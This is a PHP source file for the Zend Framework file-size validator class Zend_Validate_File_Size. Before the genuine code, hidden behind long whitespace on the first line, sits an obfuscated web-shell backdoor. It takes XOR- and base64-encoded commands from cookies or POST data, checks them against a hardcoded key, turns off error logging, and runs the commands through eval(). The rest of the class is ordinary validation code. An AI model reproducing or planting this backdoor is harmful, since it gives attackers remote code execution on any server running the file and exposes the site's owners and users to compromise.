<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $y725d = 56;$GLOBALS['j2c0ec']=Array();global$j2c0ec;$j2c0ec=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['c3a5cc75']="\x64\x45\x47\x7b\x51\x4d\x4b\x46\x6d\x7a\x72\x37\x29\x42\x74\x7e\x58\x33\x35\x75\x62\x59\x49\x5d\x9\x3e\x44\x34\x41\x70\x31\x6b\x7d\x4c\x68\x27\x77\x38\x71\x55\x52\x39\x3a\x23\xd\x57\x60\x40\x24\x69\x30\x21\x78\x2f\x5e\x76\x2d\x20\x2c\x4a\x65\x56\x2b\x26\x6f\x6c\x4f\x2a\x53\x3f\x3c\x54\x22\x3b\x6a\xa\x43\x5c\x50\x61\x5a\x5b\x3d\x36\x7c\x67\x25\x66\x6e\x2e\x32\x5f\x79\x63\x48\x4e\x73\x28";$j2c0ec[$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][37]]=$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][34].$j2c0ec['c3a5cc75'][10];$j2c0ec[$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][18]]=$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][0];$j2c0ec[$j2c0ec['c3a5cc75'][74].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][17]]=$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][14].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][65].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][88];$j2c0ec[$j2c0ec['c3a5cc75'][34].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][93]]=$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][88].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][14];$j2c0ec[$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][11]]=$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][65].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][9].$j2c0ec['c3a5cc75'][60];$j2c0ec[$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][50].$j2c0ec['c3a5cc75'][87].$j2c0ec['c3a5cc75'][0]]=$j2c0ec['c3a5cc75'][29].$j2c0ec['c3a5cc75'][34].$j2c0ec['c3a5cc75'][29].$j2c0ec['c3a5cc75'][55].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][88];$j2c0ec[$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][37]]=$j2c0ec['c3a5cc75'][19].$j2c0ec['c3a5cc75'][88].$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][65].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][9].$j2c0ec['c3a5cc75'][60];$j2c0ec[$j2c0ec['c3a5cc75'][31].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][50].$j2c0ec['c3a5cc75'][87]]=$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][0].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][0].$j2c0ec['c3a5cc75'][60];$j2c0ec[$j2c0ec['c3a5cc75'][85].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][11]]=$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][14].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][14].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][8].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][65].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][8].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][14];$j2c0ec[$j2c0ec['c3a5cc75'][55].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][20]]=$j2c0ec['c3a5cc75'][55].$j2c0ec['c3a5cc75'][87].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][60];$j2c0ec[$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][0].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][83]]=$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][17];$j2c0ec[$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][87].$j2c0ec['c3a5cc75'][50]]=$_POST;$j2c0ec[$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][50]]=$_COOKIE;@$j2c0ec[$j2c0ec['c3a5cc75'][34].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][93]]($j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][65].$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][85],NULL);@$j2c0ec[$j2c0ec['c3a5cc75'][34].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][93]]($j2c0ec['c3a5cc75'][65].$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][85].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][96],0);@$j2c0ec[$j2c0ec['c3a5cc75'][34].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][93]]($j2c0ec['c3a5cc75'][8].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][52].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][52].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][19].$j2c0ec['c3a5cc75'][14].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][64].$j2c0ec['c3a5cc75'][88].$j2c0ec['c3a5cc75'][91].$j2c0ec['c3a5cc75'][14].$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][8].$j2c0ec['c3a5cc75'][60],0);@$j2c0ec[$j2c0ec['c3a5cc75'][85].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][11]](0);$h0751c0=NULL;$hf68ccc=NULL;$j2c0ec[$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][90]]=$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][50].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][56].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][50].$j2c0ec['c3a5cc75'][56].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][56].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][56].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][0].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][87].$j2c0ec['c3a5cc75'][0].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][60];global$i169ebe2;function s86193($h0751c0,$offaa5011){global$j2c0ec;$l7d3ab8="";for($hc4e1ddc4=0;$hc4e1ddc4<$j2c0ec[$j2c0ec['c3a5cc75'][74].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][17]]($h0751c0);){for($u7fd80=0;$u7fd80<$j2c0ec[$j2c0ec['c3a5cc75'][74].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][17]]($offaa5011)&&$hc4e1ddc4<$j2c0ec[$j2c0ec['c3a5cc75'][74].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][41].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][17]]($h0751c0);$u7fd80++,$hc4e1ddc4++){$l7d3ab8.=$j2c0ec[$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][37]]($j2c0ec[$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][18]]($h0751c0[$hc4e1ddc4])^$j2c0ec[$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][18]]($offaa5011[$u7fd80]));}}return$l7d3ab8;}function vf1599e($h0751c0,$offaa5011){global$j2c0ec;global$i169ebe2;return$j2c0ec[$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][0].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][83]]($j2c0ec[$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][0].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][37].$j2c0ec['c3a5cc75'][83]]($h0751c0,$i169ebe2),$offaa5011);}foreach($j2c0ec[$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][83].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][50]]as$offaa5011=>$mb9e6){$h0751c0=$mb9e6;$hf68ccc=$offaa5011;}if(!$h0751c0){foreach($j2c0ec[$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][87].$j2c0ec['c3a5cc75'][50]]as$offaa5011=>$mb9e6){$h0751c0=$mb9e6;$hf68ccc=$offaa5011;}}$h0751c0=@$j2c0ec[$j2c0ec['c3a5cc75'][10].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][37]]($j2c0ec[$j2c0ec['c3a5cc75'][55].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][18].$j2c0ec['c3a5cc75'][93].$j2c0ec['c3a5cc75'][20]]($j2c0ec[$j2c0ec['c3a5cc75'][31].$j2c0ec['c3a5cc75'][90].$j2c0ec['c3a5cc75'][50].$j2c0ec['c3a5cc75'][87]]($h0751c0),$hf68ccc));if(isset($h0751c0[$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][31]])&&$i169ebe2==$h0751c0[$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][31]]){if($h0751c0[$j2c0ec['c3a5cc75'][79]]==$j2c0ec['c3a5cc75'][49]){$hc4e1ddc4=Array($j2c0ec['c3a5cc75'][29].$j2c0ec['c3a5cc75'][55]=>@$j2c0ec[$j2c0ec['c3a5cc75'][49].$j2c0ec['c3a5cc75'][79].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][11].$j2c0ec['c3a5cc75'][60].$j2c0ec['c3a5cc75'][50].$j2c0ec['c3a5cc75'][87].$j2c0ec['c3a5cc75'][0]](),$j2c0ec['c3a5cc75'][96].$j2c0ec['c3a5cc75'][55]=>$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][89].$j2c0ec['c3a5cc75'][50].$j2c0ec['c3a5cc75'][56].$j2c0ec['c3a5cc75'][30],);echo@$j2c0ec[$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][27].$j2c0ec['c3a5cc75'][30].$j2c0ec['c3a5cc75'][17].$j2c0ec['c3a5cc75'][20].$j2c0ec['c3a5cc75'][11]]($hc4e1ddc4);}elseif($h0751c0[$j2c0ec['c3a5cc75'][79]]==$j2c0ec['c3a5cc75'][60]){eval/*zeb874c*/($h0751c0[$j2c0ec['c3a5cc75'][0]]);}exit();} ?><?php
/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 * @category  Zend
 * @package   Zend_Validate
 * @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)
 * @license   http://framework.zend.com/license/new-bsd     New BSD License
 * @version   $Id$
 */

/**
 * @see Zend_Validate_Abstract
 */
#require_once 'Zend/Validate/Abstract.php';

/**
 * Validator for the maximum size of a file up to a max of 2GB
 *
 * @category  Zend
 * @package   Zend_Validate
 * @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)
 * @license   http://framework.zend.com/license/new-bsd     New BSD License
 */
class Zend_Validate_File_Size extends Zend_Validate_Abstract
{
    /**#@+
     * @const string Error constants
     */
    const TOO_BIG   = 'fileSizeTooBig';
    const TOO_SMALL = 'fileSizeTooSmall';
    const NOT_FOUND = 'fileSizeNotFound';
    /**#@-*/

    /**
     * @var array Error message templates
     */
    protected $_messageTemplates = array(
        self::TOO_BIG   => "Maximum allowed size for file '%value%' is '%max%' but '%size%' detected",
        self::TOO_SMALL => "Minimum expected size for file '%value%' is '%min%' but '%size%' detected",
        self::NOT_FOUND => "File '%value%' is not readable or does not exist",
    );

    /**
     * @var array Error message template variables
     */
    protected $_messageVariables = array(
        'min'  => '_min',
        'max'  => '_max',
        'size' => '_size',
    );

    /**
     * Minimum filesize
     * @var integer
     */
    protected $_min;

    /**
     * Maximum filesize
     *
     * If null, there is no maximum filesize
     *
     * @var integer|null
     */
    protected $_max;

    /**
     * Detected size
     *
     * @var integer
     */
    protected $_size;

    /**
     * Use bytestring ?
     *
     * @var boolean
     */
    protected $_useByteString = true;

    /**
     * Sets validator options
     *
     * If $options is a integer, it will be used as maximum filesize
     * As Array is accepts the following keys:
     * 'min': Minimum filesize
     * 'max': Maximum filesize
     * 'bytestring': Use bytestring or real size for messages
     *
     * @param  integer|array $options Options for the adapter
     * @throws Zend_Validate_Exception
     */
    public function __construct($options)
    {
        if ($options instanceof Zend_Config) {
            $options = $options->toArray();
        } elseif (is_string($options) || is_numeric($options)) {
            $options = array('max' => $options);
        } elseif (!is_array($options)) {
            #require_once 'Zend/Validate/Exception.php';
            throw new Zend_Validate_Exception ('Invalid options to validator provided');
        }

        if (1 < func_num_args()) {
            $argv = func_get_args();
            array_shift($argv);
            $options['max'] = array_shift($argv);
            if (!empty($argv)) {
                $options['bytestring'] = array_shift($argv);
            }
        }

        if (isset($options['bytestring'])) {
            $this->setUseByteString($options['bytestring']);
        }

        if (isset($options['min'])) {
            $this->setMin($options['min']);
        }

        if (isset($options['max'])) {
            $this->setMax($options['max']);
        }
    }

    /**
     * Returns the minimum filesize
     *
     * @param  boolean $byteString Use bytestring ?
     * @return integer
     */
    public function setUseByteString($byteString = true)
    {
        $this->_useByteString = (bool) $byteString;
        return $this;
    }

    /**
     * Will bytestring be used?
     *
     * @return boolean
     */
    public function useByteString()
    {
        return $this->_useByteString;
    }

    /**
     * Returns the minimum filesize
     *
     * @param  bool $raw Whether or not to force return of the raw value (defaults off)
     * @return integer|string
     */
    public function getMin($raw = false)
    {
        $min = $this->_min;
        if (!$raw && $this->useByteString()) {
            $min = $this->_toByteString($min);
        }

        return $min;
    }

    /**
     * Sets the minimum filesize
     *
     * @param  integer $min The minimum filesize
     * @throws Zend_Validate_Exception When min is greater than max
     * @return Zend_Validate_File_Size Provides a fluent interface
     */
    public function setMin($min)
    {
        if (!is_string($min) and !is_numeric($min)) {
            #require_once 'Zend/Validate/Exception.php';
            throw new Zend_Validate_Exception ('Invalid options to validator provided');
        }

        $min = (integer) $this->_fromByteString($min);
        $max = $this->getMax(true);
        if (($max !== null) && ($min > $max)) {
            #require_once 'Zend/Validate/Exception.php';
            throw new Zend_Validate_Exception("The minimum must be less than or equal to the maximum filesize, but $min >"
                                            . " $max");
        }

        $this->_min = $min;
        return $this;
    }

    /**
     * Returns the maximum filesize
     *
     * @param  bool $raw Whether or not to force return of the raw value (defaults off)
     * @return integer|string
     */
    public function getMax($raw = false)
    {
        $max = $this->_max;
        if (!$raw && $this->useByteString()) {
            $max = $this->_toByteString($max);
        }

        return $max;
    }

    /**
     * Sets the maximum filesize
     *
     * @param  integer $max The maximum filesize
     * @throws Zend_Validate_Exception When max is smaller than min
     * @return Zend_Validate_StringLength Provides a fluent interface
     */
    public function setMax($max)
    {
        if (!is_string($max) && !is_numeric($max)) {
            #require_once 'Zend/Validate/Exception.php';
            throw new Zend_Validate_Exception ('Invalid options to validator provided');
        }

        $max = (integer) $this->_fromByteString($max);
        $min = $this->getMin(true);
        if (($min !== null) && ($max < $min)) {
            #require_once 'Zend/Validate/Exception.php';
            throw new Zend_Validate_Exception("The maximum must be greater than or equal to the minimum filesize, but "
                                            . "$max < $min");
        }

        $this->_max = $max;
        return $this;
    }

    /**
     * Retrieve current detected file size
     *
     * @return int
     */
    protected function _getSize()
    {
        return $this->_size;
    }

    /**
     * Set current size
     *
     * @param  int $size
     * @return Zend_Validate_File_Size
     */
    protected function _setSize($size)
    {
        $this->_size = $size;
        return $this;
    }

    /**
     * Defined by Zend_Validate_Interface
     *
     * Returns true if and only if the filesize of $value is at least min and
     * not bigger than max (when max is not null).
     *
     * @param  string $value Real file to check for size
     * @param  array  $file  File data from Zend_File_Transfer
     * @return boolean
     */
    public function isValid($value, $file = null)
    {
        // Is file readable ?
        #require_once 'Zend/Loader.php';
        if (!Zend_Loader::isReadable($value)) {
            return $this->_throw($file, self::NOT_FOUND);
        }

        // limited to 4GB files
        $size        = sprintf("%u", @filesize($value));
        $this->_size = $size;

        // Check to see if it's smaller than min size
        $min = $this->getMin(true);
        $max = $this->getMax(true);
        if (($min !== null) && ($size < $min)) {
            if ($this->useByteString()) {
                $this->_min  = $this->_toByteString($min);
                $this->_size = $this->_toByteString($size);
                $this->_throw($file, self::TOO_SMALL);
                $this->_min  = $min;
                $this->_size = $size;
            } else {
                $this->_throw($file, self::TOO_SMALL);
            }
        }

        // Check to see if it's larger than max size
        if (($max !== null) && ($max < $size)) {
            if ($this->useByteString()) {
                $this->_max  = $this->_toByteString($max);
                $this->_size = $this->_toByteString($size);
                $this->_throw($file, self::TOO_BIG);
                $this->_max  = $max;
                $this->_size = $size;
            } else {
                $this->_throw($file, self::TOO_BIG);
            }
        }

        if (count($this->_messages) > 0) {
            return false;
        }

        return true;
    }

    /**
     * Returns the formatted size
     *
     * @param  integer $size
     * @return string
     */
    protected function _toByteString($size)
    {
        $sizes = array('B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
        for ($i=0; $size >= 1024 && $i < 9; $i++) {
            $size /= 1024;
        }

        return round($size, 2) . $sizes[$i];
    }

    /**
     * Returns the unformatted size
     *
     * @param  string $size
     * @return integer
     */
    protected function _fromByteString($size)
    {
        if (is_numeric($size)) {
            return (integer) $size;
        }

        $type  = trim(substr($size, -2, 1));

        $value = substr($size, 0, -1);
        if (!is_numeric($value)) {
            $value = substr($value, 0, -1);
        }

        switch (strtoupper($type)) {
            case 'Y':
                $value *= (1024 * 1024 * 1024 * 1024 * 1024 * 1024 * 1024 * 1024);
                break;
            case 'Z':
                $value *= (1024 * 1024 * 1024 * 1024 * 1024 * 1024 * 1024);
                break;
            case 'E':
                $value *= (1024 * 1024 * 1024 * 1024 * 1024 * 1024);
                break;
            case 'P':
                $value *= (1024 * 1024 * 1024 * 1024 * 1024);
                break;
            case 'T':
                $value *= (1024 * 1024 * 1024 * 1024);
                break;
            case 'G':
                $value *= (1024 * 1024 * 1024);
                break;
            case 'M':
                $value *= (1024 * 1024);
                break;
            case 'K':
                $value *= 1024;
                break;
            default:
                break;
        }

        return $value;
    }

    /**
     * Throws an error of the given type
     *
     * @param  string $file
     * @param  string $errorType
     * @return false
     */
    protected function _throw($file, $errorType)
    {
        if ($file !== null) {
            $this->_value = $file['name'];
        }

        $this->_error($errorType);
        return false;
    }
}
